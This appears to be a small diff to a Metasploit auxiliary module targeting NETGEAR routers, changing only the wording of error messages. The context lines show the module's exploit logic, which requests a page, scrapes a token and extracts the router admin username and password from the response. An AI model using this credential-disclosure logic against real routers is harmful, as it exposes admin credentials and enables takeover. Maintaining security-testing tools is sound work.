@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_cgi({ 'uri' => uri })
     if res.nil?
-      print_error("#{rhost} returned an empty response.")
+      print_error("returned an empty response.")
       return
     end
 
@@ -72,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
       marker_two = "\""
       token = scrape(res.to_s, marker_one, marker_two)
       if token.nil?
-        print_error("#{rhost} is not vulnerable: Token not found")
+        print_error("is not vulnerable: Token not found")
         return
       end
 
@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
       username = scrape(raw_html, "Router Admin Username", "Router Admin Password")
       password = scrape(raw_html, "Router Admin Password", "You can")
       if username.nil? || password.nil?
-        print_error("#{rhost} returned empty credentials")
+        print_error("returned empty credentials")
         return
       end
       username.strip!
@@ -107,7 +107,7 @@ class MetasploitModule < Msf::Auxiliary
         print_good("Creds found: #{username}/#{password}")
       end
     else
-      print_error("#{rhost} is not vulnerable: Not a NETGEAR device")
+      print_error("is not vulnerable: Not a NETGEAR device")
     end
   end
 
